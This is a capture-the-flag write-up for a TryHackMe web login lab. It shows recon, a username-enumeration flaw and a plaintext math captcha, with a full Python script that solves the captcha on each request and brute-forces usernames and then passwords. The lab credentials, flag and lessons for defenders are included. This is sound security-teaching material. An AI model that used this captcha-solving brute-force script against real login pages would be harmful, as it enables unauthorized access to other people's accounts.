# TryHackMe — Rate Limiter Bypass (Web Login Brute Force)

## Overview

| Detail | Info |
|--------|------|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **Topics** | Web Application, Brute Force, Rate Limiting, Captcha Bypass, Username Enumeration |
| **Tools Used** | Nmap, curl, Python 3 (standard library) |

A company built a web application with a custom rate limiter and slightly modified login code. Our goal: bypass the rate limiter, find valid credentials, and retrieve `flag.txt`.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22   | open  | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | open  | HTTP    | Werkzeug/2.2.2 Python/3.8.10 |

Key observations:
- **Werkzeug** is a Python WSGI library — this is almost certainly a **Flask** application
- Root `/` redirects (302) to `/login` — there's a login form
- Standard Werkzeug 404 pages — no custom error handling

### Login Form Analysis

```bash
curl -v http://<TARGET_IP>/login
```

The login form revealed:
- **POST** to `/login` with fields `username` and `password`
- Placeholder text "Firstname" — hinting usernames are first names
- **No CSRF token** — simplifies automated requests
- Company: **SecureSolaCoders.no**

---

## Vulnerability Discovery

### 1. Username Enumeration

Sending an invalid login attempt:

```bash
curl -s -X POST http://<TARGET_IP>/login \
  -d "username=admin&password=admin" | grep "error"
```

**Response:**
```
Error: The user 'admin' does not exist
```

This is a classic **username enumeration** vulnerability. The server returns different error messages depending on whether the username exists:
- `The user 'X' does not exist` → invalid username
- `Invalid password for user 'X'` → **valid username, wrong password**

This allows us to split the attack into two phases, drastically reducing the number of required attempts.

### 2. Rate Limiter Analysis

After just **1 failed login attempt**, the rate limiter activates:

```html
<h2>Too many bad login attempts!</h2>
<h3>Captcha enabled</h3>
959 + 72 = ?
<input type="text" name="captcha" id="captcha" value="" required>
```

Key findings:
- Rate limit triggers after **1 failed attempt**
- A **math captcha** is added to the form (addition, subtraction, or multiplication)
- HTTP status remains **200** (not 429) — must filter by response content
- `X-Forwarded-For` header **does not** bypass the rate limiter
- Solving the captcha correctly allows the login attempt to be processed

### 3. Captcha Weakness

The captcha is a **simple arithmetic expression rendered as plain text in HTML** — not an image. Examples observed:

```
843 * 52
811 - 56
605 * 70
621 + 36
```

Operations used: `+`, `-`, `*` (no division). This can be trivially parsed with a regex and evaluated programmatically.

---

## Exploitation

### Attack Strategy

Since every request requires solving a captcha, the brute force script must:

1. Send POST with username, password, and captcha answer (from previous response)
2. If captcha is invalid — parse the new captcha, solve it, retry the same attempt
3. Store the captcha from the current response for the next iteration
4. Check the error message to determine the result

**Two-phase approach:**
- **Phase 1:** Enumerate usernames (from `username.txt`) with a fixed password → find a valid user
- **Phase 2:** Brute force passwords (from `passwords.txt`) for the discovered user

### Brute Force Script

```python
#!/usr/bin/env python3
import urllib.request
import urllib.parse
import re
import sys

TARGET = "http://<TARGET_IP>/login"

def solve_captcha(html):
    match = re.search(r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?', html)
    if not match:
        return None
    a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
    if op == '+':
        return a + b
    if op == '-':
        return a - b
    if op == '*':
        return a * b
    return None

def try_login(username, password, captcha_answer=None):
    data = {"username": username, "password": password}
    if captcha_answer is not None:
        data["captcha"] = str(captcha_answer)
    encoded = urllib.parse.urlencode(data).encode('utf-8')
    req = urllib.request.Request(TARGET, data=encoded, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.read().decode('utf-8')
    except Exception as e:
        print(f"\n[!] Request error: {e}")
        return ""

def brute(wordlist_file, fixed_value, phase):
    with open(wordlist_file, 'r') as f:
        words = [line.strip() for line in f if line.strip()]
    print(f"[*] Phase: {phase}")
    print(f"[*] Wordlist: {wordlist_file} ({len(words)} entries)")
    captcha_answer = None
    for i, word in enumerate(words):
        if phase == "username":
            user, pwd = word, fixed_value
        else:
            user, pwd = fixed_value, word
        html = try_login(user, pwd, captcha_answer)
        if "Invalid captcha" in html or ("Captcha enabled" in html and captcha_answer is None):
            captcha_answer = solve_captcha(html)
            if captcha_answer:
                html = try_login(user, pwd, captcha_answer)
        captcha_answer = solve_captcha(html)
        if phase == "username":
            if "does not exist" not in html:
                print(f"\n[+] FOUND username: {word}")
                return word
            else:
                sys.stdout.write(f"\r  [{i+1}/{len(words)}] {word:<20}")
                sys.stdout.flush()
        else:
            if "Invalid password" in html or "does not exist" in html:
                sys.stdout.write(f"\r  [{i+1}/{len(words)}] {word:<20}")
                sys.stdout.flush()
            else:
                print(f"\n[+] FOUND password: {word}")
                return word
    print(f"\n[-] Nothing found in {phase} phase")
    return None

print("PHASE 1: Username Enumeration")
found_user = brute("username.txt", "password123", "username")

if found_user:
    print(f"\nPHASE 2: Password Brute Force for '{found_user}'")
    found_pass = brute("passwords.txt", found_user, "password")
    if found_pass:
        print(f"\n  CREDENTIALS: {found_user}:{found_pass}")
```

### Results

```
PHASE 1: Username Enumeration
[*] Phase: username
[*] Wordlist: username.txt (878 entries)
  [306/878] hugh
[+] FOUND username: natalie

PHASE 2: Password Brute Force for 'natalie'
[*] Phase: password
[*] Wordlist: passwords.txt (1567 entries)
  [343/1567] 147852369
[+] FOUND password: sk8board

CREDENTIALS: natalie:sk8board
```

Total requests: ~649 login attempts (+ captcha retries) instead of 1,376,426 combinations (878 × 1567) with a naive brute force.

---

## Capturing the Flag

Logging into the web application at `/login` with credentials `natalie:sk8board`:

```
Flag.txt:
7df2eabce36f02ca8ed7f237f77ea416
```

> **Note:** These credentials did not work for SSH on port 22 — the flag was only accessible through the web interface.

---

## Key Takeaways

### Vulnerabilities Exploited

1. **Username Enumeration** — Different error messages for invalid usernames vs invalid passwords allowed splitting the attack into two efficient phases
2. **Weak Custom Rate Limiter** — Triggered after just 1 attempt but only added a trivially solvable math captcha
3. **Plaintext Captcha** — Math expressions rendered as HTML text instead of images, easily parsed with regex

### Lessons for Defenders

- **Use generic error messages** — Always return the same message regardless of whether the username exists (e.g., "Invalid username or password")
- **Implement proper captcha** — Use established solutions (reCAPTCHA, hCaptcha) instead of custom math-based captcha
- **Layer your defenses** — Combine rate limiting with account lockout, IP-based blocking at the WAF level, and multi-factor authentication
- **Don't trust client headers** — While `X-Forwarded-For` wasn't exploitable here, many custom rate limiters incorrectly trust this header

### Efficiency of Two-Phase Brute Force

| Approach | Requests Required |
|----------|-------------------|
| All combinations (878 × 1567) | ~1,376,426 |
| Two-phase (878 + 1567) | ~2,445 (worst case) |
| Two-phase (actual) | ~649 |
| **Reduction factor** | **~2,000x faster** |
